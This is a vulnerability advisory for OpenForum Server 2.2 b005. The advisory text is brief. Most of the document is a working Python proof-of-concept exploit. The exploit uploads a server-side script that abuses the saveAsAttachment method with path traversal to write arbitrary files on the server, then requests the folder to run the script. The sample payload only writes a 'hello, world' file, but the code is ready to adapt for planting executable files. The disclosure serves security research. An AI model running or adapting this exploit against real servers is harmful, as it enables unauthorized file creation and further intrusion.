source:  http://www.securityfocus.com/bid/40364/info

OpenForum is prone to a vulnerability that may allow remote attackers to create arbitrary files on a vulnerable system.

Successful exploits will allow an attacker to create arbitrary files, which may then be executed to perform unauthorized actions. This may aid in further attacks.

OpenForum 2.2 b005 is vulnerable; other versions may also be affected.

#============================================================================================================#
#   _      _   __   __       __        _______    _____      __ __     _____     _      _    _____  __ __    #
#  /_/\  /\_\ /\_\ /\_\     /\_\     /\_______)\ ) ___ (    /_/\__/\  ) ___ (   /_/\  /\_\ /\_____\/_/\__/\  #
#  ) ) )( ( ( \/_/( ( (    ( ( (     \(___  __\// /\_/\ \   ) ) ) ) )/ /\_/\ \  ) ) )( ( (( (_____/) ) ) ) ) #
# /_/ //\\ \_\ /\_\\ \_\    \ \_\      / / /   / /_/ (_\ \ /_/ /_/ // /_/ (_\ \/_/ //\\ \_\\ \__\ /_/ /_/_/  #
# \ \ /  \ / // / // / /__  / / /__   ( ( (    \ \ )_/ / / \ \ \_\/ \ \ )_/ / /\ \ /  \ / // /__/_\ \ \ \ \  #
#  )_) /\ (_(( (_(( (_____(( (_____(   \ \ \    \ \/_\/ /   )_) )    \ \/_\/ /  )_) /\ (_(( (_____\)_) ) \ \ #
#  \_\/  \/_/ \/_/ \/_____/ \/_____/   /_/_/     )_____(    \_\/      )_____(   \_\/  \/_/ \/_____/\_\/ \_\/ #
#                                                                                                            #
#============================================================================================================#
#                                                                                                            #
# Vulnerability............Arbitrary File Write                                                              #
# Software.................Open Forum Server 2.2 b005                                                        #
# Download.................http://code.google.com/p/open-forum                                               #
# Date.....................5/23/10                                                                           #
#                                                                                                            #
#============================================================================================================#
#                                                                                                            #
# Site.....................http://cross-site-scripting.blogspot.com/                                         #
# Email....................john.leitch5@gmail.com                                                            #
#                                                                                                            #
#============================================================================================================#
#                                                                                                            #
# ##Description##                                                                                            #
#                                                                                                            #
# An arbitrary file write vulnerability in the saveAsAttachment method of Open Forum Server 2.2 b005 can be  #
# exploited to write to the local file system of the server.                                                 #
#                                                                                                            #
#                                                                                                            #
# ##Exploit##                                                                                                #
#                                                                                                            #
# Upload a get.sjs file that calls the vulnerable method. Request the script's containing folder.            #
#                                                                                                            #
#                                                                                                            #
# ##Proof of Concept##                                                                                       #
#                                                                                                            #
import sys, socket
host = 'localhost'
port = 80

def send_request(request):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(32) # sometimes it takes a while
    s.connect((host, port))
    s.send(request)

    response = s.recv(8192) + s.recv(8192) # a hack within a hack   

    return response

def write_file():
    try:
        content = '----x--\r\n'\
                  'Content-Disposition: form-data; name="file"; filename="get.sjs"\r\n'\
                  'Content-Type: application/octet-stream\r\n\r\n'\
                  'fileName = "' + '..\\\\' * 256 + 'x.txt";\r\n'\
                  'data = "hello, world";\r\n'\
                  'user = transaction.getUser();\r\n'\
                  'wiki.saveAsAttachment("x",fileName,data,user);\r\n'\
                  'transaction.sendPage("File Written");\r\n\r\n'\
                  '----x----\r\n'
        
        response = send_request('POST OpenForum/Actions/Attach?page=OpenForum HTTP/1.1\r\n'
                                'Host: ' + host + '\r\n'
                                'Content-Type: multipart/form-data; boundary=--x--\r\n'
                                'Content-Length: ' + str(len(content)) + '\r\n\r\n' + content)

        if 'HTTP/1.1 302 Redirect' not in response:
            print 'Error writing get.sjs'
            return
        else: print 'get.sjs created'
        
        response = send_request('GET OpenForum HTTP/1.1\r\n'
                                'Host: ' + host + '\r\n\r\n')

        if 'File Written' not in response:
            print 'Error writing to root'
            return
        else: print 'x.txt created in root'
        
    except Exception:
        print sys.exc_info()          

write_file()